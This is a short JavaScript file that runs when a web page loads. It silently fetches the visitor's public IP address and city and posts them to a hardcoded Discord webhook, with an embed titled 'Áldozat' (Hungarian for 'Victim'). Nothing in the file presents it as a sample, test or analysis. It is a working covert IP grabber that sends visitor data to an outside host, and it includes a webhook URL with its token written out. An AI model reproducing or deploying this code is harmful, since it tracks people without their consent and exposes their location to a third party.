document.addEventListener("DOMContentLoaded", function () {
  const webhookURL =
    "https://discord.com/api/webhooks/1240707397358452817/-Mh9X4Kw5oPVK8DS2EhVHnulO7oaZozdFOWxCVqXRKzI98Xb71RQo6GUJKDwvRv9Sgj9";

  function sendToDiscord(ip, city) {
    const request = new XMLHttpRequest();
    request.open("POST", webhookURL);
    request.setRequestHeader("Content-type", "application/json");

    const params = {
      embeds: [
        {
          title: "Áldozat",
          fields: [
            {
              name: "ipv6 címe:",
              value: ip,
              inline: false,
            },
            {
              name: "Városa:",
              value: city,
              inline: false,
            },
          ],
        },
      ],
    };

    request.send(JSON.stringify(params));
  }

  function getIpInfo(ip) {
    const request = new XMLHttpRequest();
    request.open("GET", `https://ipapi.co/${ip}/json/`, true);
    request.onload = function () {
      if (request.status >= 200 && request.status < 400) {
        const data = JSON.parse(request.responseText);
        const city = data.city || "Unknown";
        sendToDiscord(ip, city);
      } else {
        sendToDiscord(ip, "Unknown");
      }
    };
    request.onerror = function () {
      sendToDiscord(ip, "Unknown");
    };
    request.send();
  }

  const request = new XMLHttpRequest();
  request.open("GET", "https://api64.ipify.org?format=json", true);
  request.onload = function () {
    if (request.status >= 200 && request.status < 400) {
      const data = JSON.parse(request.responseText);
      const ip = data.ip;
      getIpInfo(ip);
    }
  };
  request.onerror = function () {
    console.error("Error fetching IP address.");
  };
  request.send();
});
